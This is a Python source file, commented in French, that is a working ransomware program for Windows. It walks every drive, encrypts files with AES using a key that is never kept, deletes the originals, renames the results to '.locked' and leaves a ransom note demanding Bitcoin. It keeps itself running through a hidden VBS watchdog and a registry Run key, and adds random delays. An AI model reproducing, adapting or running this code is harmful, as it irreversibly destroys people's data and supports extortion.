import os
import string
from pathlib import Path
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import multiprocessing
import winreg
import subprocess
from queue import Empty
import time
import random
import base64
import psutil
import tempfile

# Template VBS amélioré
vbs_template = r'''On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
target = "{script_path}"
watchdogName = "watchdog.vbs"

' Empêcher plusieurs watchdogs
Set colMe = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
count = 0
For Each proc In colMe
    If InStr(LCase(proc.CommandLine), LCase(watchdogName)) > 0 Then
        count = count + 1
    End If
Next
If count > 1 Then WScript.Quit

Do
    found = False
    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%python%.exe'")
    For Each objProcess In colProcessList
        ' Vérification EXACTE du script avec chemin complet
        If InStr(LCase(objProcess.CommandLine), LCase(target)) > 0 Then
            found = True
            Exit For
        End If
    Next

    If Not found Then
        ' Relance Python uniquement si aucun processus avec target n'est trouvé
        WshShell.Run "python.exe """ & target & """", 0, False
        WScript.Sleep 3000
    End If

    WScript.Sleep 5000
Loop
'''

PID_FILE = os.path.join(tempfile.gettempdir(), "watchdog.pid")
LOCK_FILE = os.path.join(tempfile.gettempdir(), "watchdog.lock")

key = os.urandom(32)  # 256 bits

extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com", ".locked", ".vbs")

folders_exclus = [
    "windows",
    "program files",
    "program files (x86)",
    "system volume information",
    "$recycle.bin",
    ".git",
    "boot",
    "temp",
    "tmp",
    "cache",
    "appdata",
    "local",
    "microsoft",
    "programdata",
    ".vscode",
    "ransomware",
    "sysmon",
    "script-mitgation"
]

vbsFile = []

script_python_path = os.path.abspath(__file__)

target_dirs = [
    os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes"),
]

def deleteVbsFileAfterFinish():
    for file in vbsFile:
        try:
            if os.path.exists(file):
                os.remove(file)
                print(f"supprimer vbs avec success {file}")
            else:
                print(f"Fichier introuvable : {file}")
        except Exception as e:
            print(f"[!] Erreur suppresion watchdog dans {file}: {e}")

def write_watchdog_pid(pid: int):
    """Écrit le PID du watchdog dans un fichier"""
    try:
        with open(PID_FILE, "w") as f:
            f.write(str(pid))
    except Exception as e:
        print(f"[!] Erreur lors de l'écriture du PID : {e}")

def create_lock_file():
    """Crée un fichier lock pour éviter les lancements multiples"""
    try:
        if os.path.exists(LOCK_FILE):
            # Vérifier si le processus est toujours actif
            try:
                with open(LOCK_FILE, 'r') as f:
                    pid = int(f.read().strip())
                if psutil.pid_exists(pid):
                    proc = psutil.Process(pid)
                    if 'python' in proc.name().lower():
                        return False  # Lock actif
            except:
                pass
        
        # Créer le lock
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        return True
    except:
        return False

def remove_lock_file():
    """Supprime le fichier lock"""
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
    except:
        pass

def is_watchdog_vbs_running():
    """Vérifie si un watchdog VBS est déjà en cours d'exécution"""
    try:
        for proc in psutil.process_iter(['name', 'cmdline']):
            try:
                if proc.info['name'] and ('wscript.exe' in proc.info['name'].lower() or 'cscript.exe' in proc.info['name'].lower()):
                    if proc.info['cmdline'] and 'watchdog.vbs' in ' '.join(proc.info['cmdline']).lower():
                        return True
            except:
                continue
    except:
        pass
    return False

def get_python_processes():
    """Obtient tous les processus Python avec leurs arguments"""
    processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
               if proc.info['name'] and 'python' in proc.info['name'].lower():
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'cmdline': ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
                    })
            except:
                continue
    except:
        pass
    return processes

def is_script_already_running(script_path):
    """Vérifie si le script est déjà en cours d'exécution avec le chemin exact"""
    current_pid = os.getpid()
    script_path_normalized = os.path.abspath(script_path).lower()
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['pid'] == current_pid:
                    continue
                    
                if proc.info['name'] and 'python' in proc.info['name'].lower():
                    cmdline = ' '.join(proc.info['cmdline']).lower() if proc.info['cmdline'] else ''
                    
                    # Vérifier si le chemin du script est dans la commande
                    if script_path_normalized in cmdline:
                        return True
                        
                    # Vérifier avec des guillemets
                    if '"' + script_path_normalized + '"' in cmdline:
                        return True
                        
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
    except:
        pass
    return False

def create_watchdog_vbs():
    global vbsFile
    
    # Vérifier si le script est déjà surveillé
    if is_script_already_running(script_python_path):
        print("[!] Script déjà en cours d'exécution")
        return False

    script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
    
    # Choisir le dossier pour le VBS
    vbs_path = None
    for folder in target_dirs:
        try:
            Path(folder).mkdir(parents=True, exist_ok=True)
            vbs_path = os.path.join(folder, "watchdog.vbs")
            break
        except Exception as e:
            print(f"Erreur préparation dossier {folder}: {e}")

    if not vbs_path:
        print("[!] Impossible de déterminer un chemin pour watchdog.vbs")
        return False

    try:
        # Écrire le VBS sur disque
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(script_final)
        vbsFile.append(vbs_path)

        # Lancer wscript.exe
        proc = subprocess.Popen(
            ["wscript.exe", vbs_path],
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )

        write_watchdog_pid(proc.pid)
        print(f"[+] Watchdog lancé (PID={proc.pid}) : {vbs_path}")
        return True

    except Exception as e:
        print(f"Erreur création/lancement watchdog : {e}")
        return False

def cleanup_watchdog():
    """Nettoie les ressources du watchdog"""
    remove_lock_file()
    
    # Tuer les processus watchdog si nécessaire
    try:
        for proc in psutil.process_iter(['name', 'cmdline']):
            try:
                if proc.info['name'] and ('wscript.exe' in proc.info['name'].lower() or 'cscript.exe' in proc.info['name'].lower()):
                    if proc.info['cmdline'] and 'watchdog.vbs' in ' '.join(proc.info['cmdline']).lower():
                        proc.terminate()
            except:
                continue
    except:
        pass


def ajouter_run_key_watchdog():
    hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
    os.makedirs(hidden_dir, exist_ok=True)

    nom_valeur = "WatchdogAuto"
    chemin_watchdog_vbs = os.path.join(hidden_dir, "watchdog.vbs")

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_watchdog_vbs)
        winreg.CloseKey(key)
        print("Clé Run watchdog ajoutée avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'ajout watchdog dans le registre : {e}")


def is_in_excluded_folder(file_path: Path):
    try:
        path_parts = [part.lower() for part in file_path.resolve().parts]
        for exclu in folders_exclus:
            for part in path_parts:
                if exclu in part:
                    return True
        return False
    except Exception as e:
        print(f"Erreur exclusion sur {file_path}: {e}")
        return True  

def get_existing_root_path():
    root_paths = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:/"
        if Path(drive).exists():
            root_paths.append(drive)
    return root_paths

def encrypte_file(input_file):
    backend = default_backend()
    iv = os.urandom(16)
    with open(input_file, 'rb') as f:
        data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    output_file = input_file + ".locked"

    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)

    os.remove(input_file)
    print(f"Fichier chiffré : {input_file}")
    return True

def worker(queue):
    while True:
        try:
            file = queue.get(timeout=10)
        except Empty:
            break
        if file is None:
            break
        try:
            if is_in_excluded_folder(file):
                continue
            if file.is_file() and file.suffix.lower() not in extensions_exclues :
                encrypte_file(str(file))
                # Pause aléatoire entre 0.5 et 3 secondes
                time.sleep(random.uniform(0.5, 3))
        except Exception as e:
            print(f"[!] Erreur sur {file}: {e}")

def process_par_lecteur(chemin, nb_process):
    chemin = Path(chemin)
    queue = multiprocessing.Queue(maxsize=30)

    processus = []
    for _ in range(nb_process):
        p = multiprocessing.Process(target=worker, args=(queue,))
        p.start()
        processus.append(p)

    for file in chemin.rglob("*"):
        try:
            queue.put(file)
        except Exception as e:
            print(f"[!] Erreur ajout fichier à la queue: {e}")

    for _ in range(nb_process):
        queue.put(None)
    max_relaunch = 3
    relaunch_counts = [0] * nb_process

    while True:
        all_finished = True
        for i, p in enumerate(processus):
            if not p.is_alive():
                if p.exitcode != 0:  # crash / erreur
                    if relaunch_counts[i] < max_relaunch:
                        print(f"[!] Worker {i} mort anormalement, redémarrage ({relaunch_counts[i]+1}/{max_relaunch})...")
                        new_p = multiprocessing.Process(target=worker, args=(queue,))
                        new_p.start()
                        processus[i] = new_p
                        relaunch_counts[i] += 1
                        all_finished = False
                    else:
                        print(f"[!] Worker {i} a atteint la limite de relance.")
                else:
                    # worker terminé proprement, on ne relance pas
                    print(f"[+] Worker {i} a terminé normalement.")
            else:
                all_finished = False
        if all_finished:
            break
        time.sleep(10)
        
def afficher_ransom_note(lecteurs):
    note = """Vos fichiers ont été chiffrés.
Veuillez envoyer 0.5 BTC à l'adresse XXXXXXXX pour obtenir la clé."""
    for folder in lecteurs:
        path = os.path.join(folder, "README.txt")
        try:
            with open(path, "w") as f:
                f.write(note)
        except:
            continue

def main():
    time.sleep(random.uniform(5, 15))
    existDir = os.path.dirname(os.path.abspath(__file__))
    if existDir.lower() not in folders_exclus:
        folders_exclus.append(existDir.lower())
        # Exécuter une seule fois au lieu d'une boucle infinie
    result = create_watchdog_vbs()
    time.sleep(0.5)
    ajouter_run_key_watchdog()
    time.sleep(0.5)

    lecteurs = get_existing_root_path()
    max_workers = 30
    nb_lecteurs = len(lecteurs)
    nb_process_par_lecteur = max(1, max_workers // nb_lecteurs)
    processus_lecteurs = []

    for lecteur in lecteurs:
        p = multiprocessing.Process(target=process_par_lecteur, args=(lecteur, nb_process_par_lecteur))
        p.start()
        processus_lecteurs.append(p)

    for p in processus_lecteurs:
        p.join()

    deleteVbsFileAfterFinish()
    afficher_ransom_note(lecteurs)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()